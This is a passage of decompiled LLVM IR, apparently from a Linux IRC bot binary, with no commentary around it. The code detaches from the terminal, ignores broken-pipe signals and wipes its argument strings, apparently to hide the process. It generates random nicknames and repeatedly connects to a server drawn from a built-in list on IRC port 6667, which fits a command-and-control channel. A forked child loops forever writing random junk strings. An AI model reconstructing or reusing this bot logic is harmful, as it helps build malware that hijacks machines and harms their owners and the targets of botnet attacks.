dec_label_pc_80565b7:                             ; preds = %dec_label_pc_80563c1, %dec_label_pc_805649f, %dec_label_pc_805644d, %dec_label_pc_8056428, %dec_label_pc_8056539, %bb
  %v0_80565bd = phi i32 [ %v1_805644d, %dec_label_pc_805644d ], [ %v3_8056440, %dec_label_pc_8056428 ], [ %v2_8056550, %dec_label_pc_8056539 ], [ ptrtoint (i8** @global_var_80756cc.33 to i32), %bb ], [ %v1_80564bc, %dec_label_pc_805649f ], [ %v1_80563de, %dec_label_pc_80563c1 ]
  ret i32 %v0_80565bd

; uselistorder directives
  uselistorder i32 %.pre26, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge971, { 1, 0 }
  uselistorder i32 %v5_805649f, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0, 2 }
  uselistorder i32 %storemerge1174, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_80756cc.33, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i64* @global_var_80756d0.34, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_80565b7, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_80564da, { 1, 0 }
  uselistorder label %dec_label_pc_8056476.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805649f, { 1, 0 }
  uselistorder label %dec_label_pc_80563fc, { 1, 0 }
  uselistorder label %dec_label_pc_8056398.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80563c1, { 1, 0 }
}

define i32 @_433() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80565be = load i32, i32* @ebp, align 4
  store i32 %v0_80565be, i32* %stack_var_-4, align 4
  %v4_80565be = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80565be, i32* @ebp, align 4
  %v0_80565c4 = load i32, i32* @global_var_807e1ac.53, align 4
  %v1_80565cc = call i32 @free(i32 %v0_80565c4)
  %v2_80565e0 = call i32 @realrand(i32 4, i32 8)
  %v1_80565e8 = inttoptr i32 %v2_80565e0 to i8*
  %v2_80565e8 = call i32 @randstring(i8* %v1_80565e8)
  store i32 %v2_80565e8, i32* @global_var_807e1ac.53, align 4
  ret i32 %v2_80565e8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_NICK(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %v4_805660a = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8056607

dec_label_pc_8056604:                             ; preds = %dec_label_pc_8056626
  %v4_8056604 = add i32 %storemerge, 1
  br label %dec_label_pc_8056607

dec_label_pc_8056607:                             ; preds = %entry, %dec_label_pc_8056604
  %storemerge = phi i32 [ %v4_8056604, %dec_label_pc_8056604 ], [ 0, %entry ]
  store i1 false, i1* @df, align 1
  store i32 %v4_805660a, i32* @edi, align 4
  %v3_805661b = call i32 @_strlen(i8* %arg1)
  %v7_8056622 = icmp ult i32 %storemerge, %v3_805661b
  %v1_8056624 = icmp eq i1 %v7_8056622, false
  %.pre = add i32 %storemerge, %v4_805660a
  br i1 %v1_8056624, label %dec_label_pc_8056607.dec_label_pc_8056633_crit_edge, label %dec_label_pc_8056626

dec_label_pc_8056607.dec_label_pc_8056633_crit_edge: ; preds = %dec_label_pc_8056607
  %.pre11 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8056633

dec_label_pc_8056626:                             ; preds = %dec_label_pc_8056607
  %v1_805662c = inttoptr i32 %.pre to i8*
  %v2_805662c = load i8, i8* %v1_805662c, align 1
  %v10_805662f = icmp eq i8 %v2_805662c, 33
  %v1_8056631 = icmp eq i1 %v10_805662f, false
  br i1 %v1_8056631, label %dec_label_pc_8056604, label %dec_label_pc_8056633

dec_label_pc_8056633:                             ; preds = %dec_label_pc_8056626, %dec_label_pc_8056607.dec_label_pc_8056633_crit_edge
  %v1_8056639.pre-phi = phi i8* [ %.pre11, %dec_label_pc_8056607.dec_label_pc_8056633_crit_edge ], [ %v1_805662c, %dec_label_pc_8056626 ]
  store i8 0, i8* %v1_8056639.pre-phi, align 1
  %v0_805663c = load i32, i32* @global_var_807e1ac.53, align 4
  %v3_805664b = call i32 @__GI_strcasecmp(i8* %arg1, i32 %v0_805663c)
  %v1_8056650 = icmp eq i32 %v3_805664b, 0
  %v1_8056652 = icmp eq i1 %v1_8056650, false
  br i1 %v1_8056652, label %dec_label_pc_8056698, label %dec_label_pc_8056654

dec_label_pc_8056654:                             ; preds = %dec_label_pc_8056633
  %v2_8056657 = load i8, i8* %tmp12, align 1
  %v10_805665a = icmp eq i8 %v2_8056657, 58
  %v1_805665c = icmp eq i1 %v10_805665a, false
  br i1 %v1_805665c, label %dec_label_pc_8056661, label %dec_label_pc_805665e

dec_label_pc_805665e:                             ; preds = %dec_label_pc_8056654
  br label %dec_label_pc_8056661

dec_label_pc_8056661:                             ; preds = %dec_label_pc_8056654, %dec_label_pc_805665e
  %v0_8056661 = load i32, i32* @global_var_807e1ac.53, align 4
  %v1_8056666 = icmp eq i32 %v0_8056661, 0
  br i1 %v1_8056666, label %dec_label_pc_8056677, label %dec_label_pc_805666a

dec_label_pc_805666a:                             ; preds = %dec_label_pc_8056661
  %v1_8056672 = call i32 @free(i32 %v0_8056661)
  br label %dec_label_pc_8056677

dec_label_pc_8056677:                             ; preds = %dec_label_pc_8056661, %dec_label_pc_805666a
  %v2_8056686 = call i32 @realrand(i32 4, i32 8)
  %v1_805668e = inttoptr i32 %v2_8056686 to i8*
  %v2_805668e = call i32 @randstring(i8* %v1_805668e)
  store i32 %v2_805668e, i32* @global_var_807e1ac.53, align 4
  br label %dec_label_pc_8056698

dec_label_pc_8056698:                             ; preds = %dec_label_pc_8056633, %dec_label_pc_8056677
  %v0_805669d = phi i32 [ %v3_805664b, %dec_label_pc_8056633 ], [ %v2_805668e, %dec_label_pc_8056677 ]
  ret i32 %v0_805669d

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8056698, { 1, 0 }
  uselistorder label %dec_label_pc_8056677, { 1, 0 }
  uselistorder label %dec_label_pc_8056661, { 1, 0 }
  uselistorder label %dec_label_pc_8056607, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805669e = load i32, i32* @ebp, align 4
  store i32 %v0_805669e, i32* %stack_var_-4, align 4
  %v4_805669e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805669e, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_80566b2 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_80566b2, i32* %stack_var_-76, align 4
  %v5_80566d9 = call i32 @getsockopt(i32 %v0_80566b2)
  %v4_80566e1 = icmp eq i32 %v5_80566d9, 0
  %v1_80566e5 = icmp eq i1 %v4_80566e1, false
  br i1 %v1_80566e5, label %dec_label_pc_80566f4.preheader, label %dec_label_pc_80566e7

dec_label_pc_80566e7:                             ; preds = %entry
  %v3_80566e7 = load i32, i32* %stack_var_-24, align 4
  %v1_80566ea = icmp eq i32 %v3_80566e7, 0
  br i1 %v1_80566ea, label %dec_label_pc_8056959, label %dec_label_pc_80566f4.preheader

dec_label_pc_80566f4.preheader:                   ; preds = %entry, %dec_label_pc_80566e7
  %v2_80567c2 = ptrtoint i32* %stack_var_-44 to i32
  %v2_80567c5 = ptrtoint i32* %stack_var_-40 to i32
  %v2_8056811 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_80566f4

dec_label_pc_80566f4:                             ; preds = %dec_label_pc_80566f4.backedge, %dec_label_pc_80566f4.preheader
  store i32 -1, i32* @global_var_807e1b0.29, align 16
  store i32 1, i32* %stack_var_-48, align 4
  %v0_8056705 = load i32, i32* @global_var_80756c4.446, align 4
  %v1_805670a = icmp eq i32 %v0_8056705, 0
  %v1_805670c = icmp eq i1 %v1_805670a, false
  br i1 %v1_805670c, label %dec_label_pc_8056731, label %dec_label_pc_805670e

dec_label_pc_805670e:                             ; preds = %dec_label_pc_80566f4
  %v1_805670e = call i32 @random()
  %v0_8056715 = load i64, i64* @global_var_8070680.549, align 8
  %sext = mul i64 %v0_8056715, 4294967296
  %v5_805671a = sdiv i64 %sext, 4294967296
  %v1_805671f = ashr i32 %v1_805670e, 31
  %v6_8056720 = zext i32 %v1_805670e to i64
  %v8_8056720 = zext i32 %v1_805671f to i64
  %v9_8056720 = mul nuw i64 %v8_8056720, 4294967296
  %v10_8056720 = or i64 %v9_8056720, %v6_8056720
  %v14_8056720 = srem i64 %v10_8056720, %v5_805671a
  %v15_8056720 = trunc i64 %v14_8056720 to i32
  %v1_8056725 = mul i32 %v15_8056720, 4
  %v2_8056725 = add i32 %v1_8056725, ptrtoint ([14 x i8]** @global_var_8070684.551 to i32)
  %v3_8056725 = inttoptr i32 %v2_8056725 to i32*
  %v4_8056725 = load i32, i32* %v3_8056725, align 4
  store i32 %v4_8056725, i32* @global_var_807e2e4.445, align 4
  br label %dec_label_pc_8056731

dec_label_pc_8056731:                             ; preds = %dec_label_pc_80566f4, %dec_label_pc_805670e
  store i32 0, i32* @global_var_80756c4.446, align 4
  br label %dec_label_pc_805673b

dec_label_pc_805673b:                             ; preds = %dec_label_pc_805673b, %dec_label_pc_8056731
  store i32 2, i32* %stack_var_-76, align 4
  %v3_8056752 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_8056752, i32* @global_var_807e1b0.29, align 16
  %v2_8056761 = icmp slt i32 %v3_8056752, 0
  br i1 %v2_8056761, label %dec_label_pc_805673b, label %dec_label_pc_8056765

dec_label_pc_8056765:                             ; preds = %dec_label_pc_805673b
  %v0_8056765 = load i32, i32* @global_var_807e2e4.445, align 4
  store i32 %v0_8056765, i32* %stack_var_-76, align 4
  %v1_805676d = call i32 @inet_addr(i32 %v0_8056765)
  %v1_8056772 = icmp eq i32 %v1_805676d, 0
  br i1 %v1_8056772, label %dec_label_pc_8056788, label %dec_label_pc_8056776

dec_label_pc_8056776:                             ; preds = %dec_label_pc_8056765
  %v0_8056776 = load i32, i32* @global_var_807e2e4.445, align 4
  store i32 %v0_8056776, i32* %stack_var_-76, align 4
  %v1_805677e = call i32 @inet_addr(i32 %v0_8056776)
  %v10_8056783 = icmp eq i32 %v1_805677e, -1
  %v1_8056786 = icmp eq i1 %v10_8056783, false
  br i1 %v1_8056786, label %dec_label_pc_80567e2, label %dec_label_pc_8056788

dec_label_pc_8056788:                             ; preds = %dec_label_pc_8056776, %dec_label_pc_8056765
  %v0_8056788 = load i32, i32* @global_var_807e2e4.445, align 4
  store i32 %v0_8056788, i32* %stack_var_-76, align 4
  %v1_8056790 = call i32 @__GI_gethostbyname(i32 %v0_8056788)
  %v4_8056798 = icmp eq i32 %v1_8056790, 0
  %v1_805679c = icmp eq i1 %v4_8056798, false
  br i1 %v1_805679c, label %dec_label_pc_80567ba, label %dec_label_pc_805679e

dec_label_pc_805679e:                             ; preds = %dec_label_pc_8056788
  store i32 0, i32* @global_var_807e2e4.445, align 4
  %v0_80567a8 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_80567a8, i32* %stack_var_-76, align 4
  %v1_80567b0 = call i32 @close(i32 %v0_80567a8)
  br label %dec_label_pc_80566f4.backedge

dec_label_pc_80566f4.backedge:                    ; preds = %dec_label_pc_805679e, %dec_label_pc_805693d
  br label %dec_label_pc_80566f4

dec_label_pc_80567ba:                             ; preds = %dec_label_pc_8056788
  %v1_80567bd = add i32 %v1_8056790, 12
  %v2_80567bd = inttoptr i32 %v1_80567bd to i32*
  %v3_80567bd = load i32, i32* %v2_80567bd, align 4
  %v1_80567cb = add i32 %v1_8056790, 16
  %v2_80567cb = inttoptr i32 %v1_80567cb to i32*
  %v3_80567cb = load i32, i32* %v2_80567cb, align 4
  %v1_80567ce = inttoptr i32 %v3_80567cb to i32*
  %v2_80567ce = load i32, i32* %v1_80567ce, align 4
  store i32 %v2_80567ce, i32* %stack_var_-76, align 4
  %v3_80567db = call i32 @bcopy(i32 %v2_80567ce, i32 %v2_80567c5, i32 %v3_80567bd)
  br label %dec_label_pc_80567f2

dec_label_pc_80567e2:                             ; preds = %dec_label_pc_8056776
  %v0_80567e2 = load i32, i32* @global_var_807e2e4.445, align 4
  store i32 %v0_80567e2, i32* %stack_var_-76, align 4
  %v1_80567ea = call i32 @inet_addr(i32 %v0_80567e2)
  store i32 %v1_80567ea, i32* %stack_var_-40, align 4
  br label %dec_label_pc_80567f2

dec_label_pc_80567f2:                             ; preds = %dec_label_pc_80567ba, %dec_label_pc_80567e2
  store i32 2, i32* %stack_var_-44, align 4
  store i32 6667, i32* %stack_var_-76, align 4
  %v2_80567ff = call i32 @htons(i16 6667)
  %v0_805680b = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_805680b, i32* %stack_var_-76, align 4
  %v3_8056823 = call i32 @ioctl(i32 %v0_805680b, i32 21537, i32 %v2_8056811)
  store i32 0, i32* %stack_var_-76, align 4
  %v2_805682f = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_8056925

dec_label_pc_805683c:                             ; preds = %dec_label_pc_8056925
  %v1_805683c = call i32 @__errno_location(i32 %v2_805682f)
  %v1_8056841 = inttoptr i32 %v1_805683c to i32*
  store i32 0, i32* %v1_8056841, align 4
  %v0_805684a = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_805684a, i32* %stack_var_-76, align 4
  %v3_805685f = call i32 @connect(i32 %v0_805684a, i32 %v2_80567c2, i32 16)
  %v1_8056864 = icmp eq i32 %v3_805685f, 0
  br i1 %v1_8056864, label %dec_label_pc_8056878, label %dec_label_pc_8056868

dec_label_pc_8056868:                             ; preds = %dec_label_pc_805683c
  %v0_8056868 = load i32, i32* %stack_var_-76, align 4
  %v1_8056868 = call i32 @__errno_location(i32 %v0_8056868)
  %v1_805686d = inttoptr i32 %v1_8056868 to i32*
  %v2_805686d = load i32, i32* %v1_805686d, align 4
  %v9_805686f = icmp eq i32 %v2_805686d, 106
  %v1_8056872 = icmp eq i1 %v9_805686f, false
  br i1 %v1_8056872, label %dec_label_pc_8056901, label %dec_label_pc_8056878

dec_label_pc_8056878:                             ; preds = %dec_label_pc_8056868, %dec_label_pc_805683c
  %v0_8056878 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_8056878, i32* %stack_var_-76, align 4
  %v5_80568a0 = call i32 @__GI_setsockopt(i32 %v0_8056878, i32 1, i32 13, i32 0, i32 0)
  %v0_80568a5 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_80568a5, i32* %stack_var_-76, align 4
  %v5_80568cd = call i32 @__GI_setsockopt(i32 %v0_80568a5, i32 1, i32 2, i32 0, i32 0)
  %v0_80568d2 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_80568d2, i32* %stack_var_-76, align 4
  %v5_80568fa = call i32 @__GI_setsockopt(i32 %v0_80568d2, i32 1, i32 9, i32 0, i32 0)
  br label %dec_label_pc_8056959

dec_label_pc_8056901:                             ; preds = %dec_label_pc_8056868
  %v0_8056901 = load i32, i32* %stack_var_-76, align 4
  %v1_8056901 = call i32 @__errno_location(i32 %v0_8056901)
  %v1_8056906 = inttoptr i32 %v1_8056901 to i32*
  %v2_8056906 = load i32, i32* %v1_8056906, align 4
  %v9_8056908 = icmp eq i32 %v2_8056906, 115
  br i1 %v9_8056908, label %dec_label_pc_8056919, label %dec_label_pc_805690d

dec_label_pc_805690d:                             ; preds = %dec_label_pc_8056901
  %v0_805690d = load i32, i32* %stack_var_-76, align 4
  %v1_805690d = call i32 @__errno_location(i32 %v0_805690d)
  %v1_8056912 = inttoptr i32 %v1_805690d to i32*
  %v2_8056912 = load i32, i32* %v1_8056912, align 4
  %v9_8056914 = icmp eq i32 %v2_8056912, 114
  %v1_8056917 = icmp eq i1 %v9_8056914, false
  br i1 %v1_8056917, label %dec_label_pc_805693d, label %dec_label_pc_8056919

dec_label_pc_8056919:                             ; preds = %dec_label_pc_805690d, %dec_label_pc_8056901
  store i32 1, i32* %stack_var_-76, align 4
  %v1_8056920 = call i32 @sleep(i32 1)
  br label %dec_label_pc_8056925

dec_label_pc_8056925:                             ; preds = %dec_label_pc_80567f2, %dec_label_pc_8056919
  store i32 0, i32* %stack_var_-76, align 4
  %v2_805692c = call i32 @__GI_time(i32* null)
  %v5_8056931 = sub i32 %v2_805692c, %v2_805682f
  %tmp = icmp ult i32 %v5_8056931, 10
  br i1 %tmp, label %dec_label_pc_805683c, label %dec_label_pc_805693d

dec_label_pc_805693d:                             ; preds = %dec_label_pc_805690d, %dec_label_pc_8056925
  store i32 0, i32* @global_var_807e2e4.445, align 4
  %v0_8056947 = load i32, i32* @global_var_807e1b0.29, align 16
  store i32 %v0_8056947, i32* %stack_var_-76, align 4
  %v1_805694f = call i32 @close(i32 %v0_8056947)
  br label %dec_label_pc_80566f4.backedge

dec_label_pc_8056959:                             ; preds = %dec_label_pc_80566e7, %dec_label_pc_8056878
  %v0_805695a = phi i32 [ 0, %dec_label_pc_80566e7 ], [ %v5_80568fa, %dec_label_pc_8056878 ]
  %v2_8056959 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056959, i32* @ebp, align 4
  ret i32 %v0_805695a

; uselistorder directives
  uselistorder i32 %v2_805682f, { 1, 0 }
  uselistorder i32 %v0_80566b2, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-76, { 3, 4, 5, 0, 1, 6, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32)* @connect, { 8, 7, 1, 9, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i16)* @htons, { 1, 2, 63, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 8, 7, 6, 3, 2, 5, 4, 0, 1 }
  uselistorder i32 (i32)* @getsockopt, { 3, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_8056959, { 1, 0 }
  uselistorder label %dec_label_pc_805693d, { 1, 0 }
  uselistorder label %dec_label_pc_8056925, { 1, 0 }
  uselistorder label %dec_label_pc_80567f2, { 1, 0 }
  uselistorder label %dec_label_pc_80566f4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8056731, { 1, 0 }
  uselistorder label %dec_label_pc_80566f4.preheader, { 1, 0 }
}

define i32 @makeFukdString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805695e = load i32, i32* @esi, align 4
  %v0_805695f = load i32, i32* @ebx, align 4
  store i32 %v0_805695f, i32* %stack_var_-12, align 4
  %v2_805696a = call i32 @__GI_time(i32* null)
  %v1_8056972 = call i32 @srand(i32 %v2_805696a)
  %v5_805698c = ptrtoint i8* %arg1 to i32
  %v5_80569e219 = icmp sgt i32 %arg2, 0
  br i1 %v5_80569e219, label %dec_label_pc_8056987, label %dec_label_pc_80569e4

dec_label_pc_8056987:                             ; preds = %entry, %dec_label_pc_8056987
  %storemerge20 = phi i32 [ %v4_80569d9, %dec_label_pc_8056987 ], [ 0, %entry ]
  %v6_805698c = add i32 %storemerge20, %v5_805698c
  store i32 %v6_805698c, i32* @ebx, align 4
  %v0_805698f = call i32 @random()
  store i32 %v0_805698f, i32* @ecx, align 4
  %v2_80569b1 = sdiv i32 %v0_805698f, 49
  store i32 %v2_80569b1, i32* @esi, align 4
  %tmp12 = mul i32 %v2_80569b1, -223
  %v2_80569cc = add i32 %tmp12, %v0_805698f
  %v14_80569cc = trunc i32 %v2_80569cc to i8
  %v2_80569d5 = add i8 %v14_80569cc, 33
  %v2_80569d7 = load i32, i32* @ebx, align 4
  %v3_80569d7 = inttoptr i32 %v2_80569d7 to i8*
  store i8 %v2_80569d5, i8* %v3_80569d7, align 1
  %v4_80569d9 = add nuw nsw i32 %storemerge20, 1
  %exitcond = icmp eq i32 %v4_80569d9, %arg2
  br i1 %exitcond, label %dec_label_pc_80569e4, label %dec_label_pc_8056987

dec_label_pc_80569e4:                             ; preds = %dec_label_pc_8056987, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_8056987 ]
  %v2_80569e7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80569e7, i32* @ebx, align 4
  store i32 %v0_805695e, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_80569d9, { 1, 0 }
  uselistorder i32 %v2_80569b1, { 1, 0 }
  uselistorder i32 %v0_805698f, { 1, 0, 2 }
  uselistorder i8 33, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8056987, { 1, 0 }
}

define i32 @touchMyself(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80569eb = load i32, i32* @ebp, align 4
  store i32 %v0_80569eb, i32* %stack_var_-4, align 4
  %v4_80569eb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80569eb, i32* @ebp, align 4
  %v1_80569f1 = call i32 @fork(i32 %v0_80569eb)
  %v1_80569f6 = icmp eq i32 %v1_80569f1, 0
  %v1_80569f8 = icmp eq i1 %v1_80569f6, false
  br i1 %v1_80569f8, label %dec_label_pc_8056a38, label %dec_label_pc_80569fa

dec_label_pc_80569fa:                             ; preds = %entry, %dec_label_pc_80569fa
  %v0_80569fa = call i32 @random()
  %v2_8056a11 = srem i32 %v0_80569fa, 128
  %v1_8056a13 = add nsw i32 %v2_8056a11, 1024
  %v2_8056a1c = load i32, i32* %arg1, align 4
  %v2_8056a25 = inttoptr i32 %v2_8056a1c to i8*
  %v3_8056a25 = call i32 @makeFukdString(i8* %v2_8056a25, i32 %v1_8056a13)
  %v1_8056a31 = call i32 @sleep(i32 3)
  br label %dec_label_pc_80569fa

dec_label_pc_8056a38:                             ; preds = %entry
  %v2_8056a38 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056a38, i32* @ebp, align 4
  ret i32 %v1_80569f1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80569fa, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-2508 = alloca i32, align 4
  %stack_var_-6604 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-6672 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8056a3a = ptrtoint i32* %stack_var_4 to i32
  %v1_8056a57 = call i32 @__GI_setsid(i32 %v2_8056a3a)
  store i32 13, i32* %stack_var_-6672, align 4
  %v3_8056a6b = call i32 @__bsd_signal(i32 13, i32 1)
  %v0_8056a70 = load i32, i32* %stack_var_-6672, align 4
  %v1_8056a70 = call i32 @fork(i32 %v0_8056a70)
  %v1_8056a75 = icmp eq i32 %v1_8056a70, 0
  br i1 %v1_8056a75, label %dec_label_pc_805703e, label %dec_label_pc_8056a7d

dec_label_pc_8056a7d:                             ; preds = %entry
  %v1_8056a83 = add i32 %v2_8056a3a, 4
  store i32 %v1_8056a83, i32* %stack_var_-6672, align 4
  %v1_8056a89 = inttoptr i32 %v1_8056a83 to i32*
  %v2_8056a89 = call i32 @touchMyself(i32* %v1_8056a89)
  store i32 1702524235, i32* @global_var_807e0a0.63, align 32
  store i32 1886283123, i32* @global_var_807e0a4.552, align 4
  store i32 1934190945, i32* @global_var_807e0a8.553, align 8
  store i32 1920298841, i32* @global_var_807e0ac.554, align 4
  store i32 6582087, i32* @global_var_807e0b0.555, align 16
  br label %dec_label_pc_8056b29

dec_label_pc_8056ac9:                             ; preds = %dec_label_pc_8056b29
  %v2_8056acc = mul i32 %storemerge12, 4
  %v3_8056ad7 = load i32, i32* %v1_8056a89, align 4
  %v2_8056ada = add i32 %v3_8056ad7, %v2_8056acc
  %v1_8056add = inttoptr i32 %v2_8056ada to i32*
  %v2_8056add = load i32, i32* %v1_8056add, align 4
  store i1 false, i1* @df, align 1
  %v4_8056aed = inttoptr i32 %v2_8056add to i8*
  store i32 %v2_8056add, i32* @edi, align 4
  %v3_8056af3 = call i32 @_strlen(i8* %v4_8056aed)
  store i32 %v2_8056a3a, i32* @ebx, align 4
  %v3_8056b0a = load i32, i32* %v1_8056a89, align 4
  %v2_8056b0d = add i32 %v3_8056b0a, %v2_8056acc
  %v1_8056b10 = inttoptr i32 %v2_8056b0d to i32*
  %v2_8056b10 = load i32, i32* %v1_8056b10, align 4
  store i32 %v2_8056b10, i32* %stack_var_-6672, align 4
  %v5_8056b21 = inttoptr i32 %v2_8056b10 to i8*
  %v6_8056b21 = call i32 @__GI_memset(i8* %v5_8056b21, i32 0, i32 %v3_8056af3)
  %v4_8056b26 = add i32 %storemerge12, 1
  br label %dec_label_pc_8056b29

dec_label_pc_8056b29:                             ; preds = %dec_label_pc_8056a7d, %dec_label_pc_8056ac9
  %storemerge12 = phi i32 [ %v4_8056b26, %dec_label_pc_8056ac9 ], [ 1, %dec_label_pc_8056a7d ]
  store i32 %v2_8056a3a, i32* @edi, align 4
  %v3_8056b32 = load i32, i32* %stack_var_4, align 4
  %v5_8056b34 = icmp slt i32 %storemerge12, %v3_8056b32
  br i1 %v5_8056b34, label %dec_label_pc_8056ac9, label %dec_label_pc_8056b36

dec_label_pc_8056b36:                             ; preds = %dec_label_pc_8056b29
  store i32 0, i32* %stack_var_-6672, align 4
  %v2_8056b3d = call i32 @__GI_time(i32* null)
  store i32 %v2_8056b3d, i32* @ebx, align 4
  %v0_8056b44 = load i32, i32* %stack_var_-6672, align 4
  %v1_8056b44 = call i32 @__libc_getpid(i32 %v0_8056b44)
  %v0_8056b49 = load i32, i32* @ebx, align 4
  %v2_8056b49 = xor i32 %v0_8056b49, %v1_8056b44
  store i32 %v2_8056b49, i32* @ebx, align 4
  %v0_8056b4b = load i32, i32* %stack_var_-6672, align 4
  %v1_8056b4b = call i32 @getppid(i32 %v0_8056b4b)
  %v0_8056b50 = load i32, i32* @ebx, align 4
  %v2_8056b50 = add i32 %v0_8056b50, %v1_8056b4b
  store i32 %v2_8056b50, i32* %stack_var_-6672, align 4
  %v1_8056b56 = call i32 @srand(i32 %v2_8056b50)
  store i32 4, i32* %stack_var_-6672, align 4
  %v3_8056b6a = call i32 @realrand(i32 4, i32 8)
  store i32 %v3_8056b6a, i32* %stack_var_-6672, align 4
  %v1_8056b72 = inttoptr i32 %v3_8056b6a to i8*
  %v2_8056b72 = call i32 @randstring(i8* %v1_8056b72)
  store i32 %v2_8056b72, i32* @global_var_807e1ac.53, align 4
  store i32 4, i32* %stack_var_-6672, align 4
  %v3_8056b8b = call i32 @realrand(i32 4, i32 8)
  store i32 %v3_8056b8b, i32* %stack_var_-6672, align 4
  %v1_8056b93 = inttoptr i32 %v3_8056b8b to i8*
  %v2_8056b93 = call i32 @randstring(i8* %v1_8056b93)
  store i32 %v2_8056b93, i32* @global_var_807e1a4.36, align 4
  store i32 4, i32* %stack_var_-6672, align 4
  %v3_8056bac = call i32 @realrand(i32 4, i32 8)
  store i32 %v3_8056bac, i32* %stack_var_-6672, align 4
  %v1_8056bb4 = inttoptr i32 %v3_8056bac to i8*
  %v2_8056bb4 = call i32 @randstring(i8* %v1_8056bb4)
  store i32 %v2_8056bb4, i32* @global_var_807e1d0.556, align 16
  store i32 ptrtoint ([7 x i8]* @global_var_806d522.557 to i32), i32* @global_var_807f34c.280, align 4
  store i32 ptrtoint (i32* @global_var_806d529.558 to i32), i32* @global_var_807f31c.541, align 4
  store i32 0, i32* @global_var_807e2e4.445, align 4
  %v2_8056c34 = ptrtoint i32* %stack_var_-460 to i32
  %tmp74 = bitcast i32* %stack_var_-460 to i8*
  %v4_8056c7f = ptrtoint i32* %stack_var_-332 to i32
  %v2_8056df7 = ptrtoint i32* %stack_var_-6604 to i32
  %v2_8056ec9 = ptrtoint i32* %stack_var_-2508 to i32
  %v2_8056f22 = ptrtoint i32* %stack_var_-1484 to i32
  %v3_8056f2b = bitcast i32* %stack_var_-1484 to i8*
  %tmp75 = bitcast i8** %stack_var_-32 to i32*
  %v3_8056eac = bitcast i32* %stack_var_-2508 to i8*
  br label %dec_label_pc_8056bde

